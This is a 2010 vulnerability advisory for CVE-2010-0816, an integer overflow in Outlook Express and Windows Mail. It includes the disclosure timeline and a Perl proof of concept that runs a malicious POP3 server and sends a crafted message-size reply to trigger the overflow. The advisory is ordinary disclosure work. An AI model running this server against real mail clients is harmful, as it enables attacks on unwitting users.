@@ -1,0 +1,127 @@
+Application:   Microsoft Outlook Express
+Microsoft Windows Mail
+
+Platforms:   Windows 2000
+Windows XP
+Windows Vista
+Windows server 2003
+Windows Server 2008 SR2
+
+Exploitation:   Remote Exploitable   
+
+CVE Number:   CVE-2010-0816
+
+Discover Date:   2009-09-11
+
+Author:   Francis Provencher (Protek Research Lab's)
+
+Website:   http://www.protekresearchlab.com   
+
+
+#####################################################################################
+
+1) Introduction
+2) Report Timeline
+3) Technical details
+4) Products affected
+5) The Code
+
+
+#####################################################################################
+
+=================
+1) Introduction
+=================
+
+Windows Mail is an e-mail  and newsgroup client included in Windows Vista, that was superseded by Windows Live Mail.
+
+It is the successor to Outlook Express. Microsoft previewed Windows Mail on Channel 9 on October 10, 2005.[1]
+
+Unlike Outlook Express, Windows Mail is not considered to be a component of Internet Explorer. As such, it will not
+
+be made available for earlier Windows operating systems, while Windows Internet Explorer 7 was made available for
+
+Windows XP.
+
+Windows Mail has been succeeded by Windows Live Mail, which was built by the same development team as Windows Mail
+
+and also serves as the replacement for Outlook Express for Windows XP.
+
+(Wikipedia)
+#####################################################################################
+
+====================
+2) Report Timeline
+====================
+
+2009-11-09  Vendor Contacted
+2009-11-09  Vendor Response
+2009-11-16  Vendor request a PoC
+2009-11-16  PoC is send
+2009-11-19  Vendor confirme they received PoC
+2009-11-24  Vendor confirm the vulnerability
+2010-05-11  Public release of this advisory 
+
+#####################################################################################
+
+======================
+3) Technical details
+======================
+
+An unauthenticated remote code execution vulnerability exists in the way that the Windows Mail Client software
+
+handles specially crafted mail responses. An attempt to exploit the vulnerability would not require authentication,
+
+allowing an attacker to exploit the vulnerability by sending a specially crafted response to a client initiating a
+
+connection to a server under his control using the common mail protocols.
+
+
+The vulnerability is caused by a common library used by Outlook Express and Windows Mail insufficiently validating
+
+network data before using that data to calculate the necessary size of a buffer.
+
+
+
+#####################################################################################
+
+=====================
+4) Product affected
+=====================
+
+Mail client;   Microsoft Outlook Express & Microsoft Windows Mail
+Plateforms;   Vista SP1 & Windows Server 2008 SP1
+
+#####################################################################################
+
+=============
+5) The Code
+=============
+
+
+#!/usr/bin/perl -w
+# Found by Francis Provencher for Protek Research Lab's
+# {PRL} Microsoft Windows Mail CLient & outlook express Remote Integer Overflow
+#
+
+
+
+use IO::Socket;
+
+$port = 110;
+
+$serv = IO::Socket::INET->new(Proto=>'tcp',
+LocalPort=>$port,
+Listen=>1)
+or die "Error: listen($port)\n";
+
+$cli = $serv->accept() or die "Error: accept()\n";
+
+
+$cli->send("+OK\r\n");
+$cli->recv($recvbuf, 512);
+$cli->send("+OK\r\n");
+$cli->recv($recvbuf, 512);
+$cli->send("+OK\r\n");
+$cli->recv($recvbuf, 512);
+$cli->send("+OK 357913944 100\r\n");
